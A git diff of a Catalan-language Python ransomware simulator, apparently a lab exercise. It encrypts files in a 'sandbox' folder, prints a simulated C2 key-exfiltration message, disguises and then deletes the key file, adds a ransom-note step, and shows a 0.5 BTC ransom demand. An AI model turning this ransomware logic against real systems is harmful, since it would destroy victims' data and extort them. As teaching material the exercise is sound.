@@ -2,21 +2,21 @@ import os
 import file_manager                 
 import crypto_engine
 
-# --- CONFIGURACIÓ I CONSTANTS ---
+# --- CONFIGURACIO I CONSTANTS ---
 RUTA_SANDBOX = "sandbox"
-# SDR-16: Camuflatge de la clau (ja no és .key)
+
 RUTA_CLAU = "config_sys_04.dat"
 PROHIBITED_WHITELIST = [".py", ".key", ".exe", ".dll", ".sys", ".locked", ".ini", ".lnk", ".bat", ".dat"]
 
-# SDR-24: Ruta del projecte
+
 RUTA_PROPIA = os.path.dirname(os.path.abspath(__file__))
 
 def simular_exfiltracio_clau():
     print("\n" + "-"*40)
-    print("[CONNEXIÓ] Connectant amb el servidor C2...")
+    print("[CONNEXIO] Connectant amb el servidor C2...")
     print("[INFO] Enviant clau de xifratge de forma segura...")
-    file_manager.registrar_log("CLAU EXFILTRADA AL SERVIDOR EXTERN (SDR-16)", "CRITICAL")
-    print("[✔] CLAU ENVIADA. Còpia de seguretat eliminada del control de l'usuari.")
+    file_manager.registrar_log("CLAU EXFILTRADA AL SERVIDOR EXTERN", "CRITICAL")
+    print("[✔] CLAU ENVIADA. Copia de seguretat eliminada del control de l'usuari.")
     print("-"*40)
 
 def mostrar_menu():             
@@ -39,7 +39,7 @@ def mostrar_menu():
                 print("[X] ERROR: NO EXISTEIX EL FOLDER SANDBOX")
                 continue
                 
-            # Generació i Exfiltració (SDR-16)
+            # Generacio i Exfiltracio (SDR-16)
             print("\n[+] GENERANT ALGORITME DE SEGURETAT...")
             crypto_engine.generar_i_guardar_clau(RUTA_CLAU)
             simular_exfiltracio_clau()
@@ -59,14 +59,18 @@ def mostrar_menu():
                     continue
 
                 crypto_engine.xifrar_arxiu(ruta_completa, clau)
+
+            file_manager.generar_nota_rescat(RUTA_SANDBOX)
+
+
             
-            # SDR-16: Autodestrucció de la clau local
+            # SDR-16: Autodestruccio de la clau local
             if os.path.exists(RUTA_CLAU):
                 os.remove(RUTA_CLAU)
-                print("\n[!] ATENCIÓ: Clau local destruïda per seguretat.")
-                file_manager.registrar_log("CLAU LOCAL ELIMINADA (SDR-16)", "CRITICAL")
+                print("\n[!] ATENCIO: Clau local destruida per seguretat.")
+                file_manager.registrar_log("CLAU LOCAL ELIMINADA", "CRITICAL")
             
-            print(f"\n[✔] INFECCIÓ COMPLETADA A {RUTA_SANDBOX}")
+            print(f"\n[✔] INFECCIO COMPLETADA A {RUTA_SANDBOX}")
 
         elif opcio == "2":
             clau = crypto_engine.carregar_clau(RUTA_CLAU)
@@ -74,14 +78,14 @@ def mostrar_menu():
             if not clau:
                 # SDR-16: El missatge de rescat
                 print("\n" + "!" * 40)
-                print("⚠️  SISTEMA DE RECUPERACIÓ BLOQUEJAT  ⚠️")
+                print("⚠️  SISTEMA DE RECUPERACIO BLOQUEJAT  ⚠️")
                 print("No s'ha trobat la clau: config_sys_04.dat")
                 print("Rescat: Envia 0.5 BTC a l'adreça del servidor C2.")
                 print("!" * 40)
-                file_manager.registrar_log("INTENT DE RECUPERACIÓ SENSE CLAU", "WARNING")
+                file_manager.registrar_log("INTENT DE RECUPERACIO SENSE CLAU", "WARNING")
                 continue
 
-            # Si la clau existeix (perquè l'hem posat manualment per provar), desxifra:
+            # Si la clau existeix (perque l'hem posat manualment per provar), desxifra:
             llista_arxius = file_manager.llistar_fitxers(RUTA_SANDBOX)
             for ruta_completa in llista_arxius:
                 if ruta_completa.endswith(".locked"):
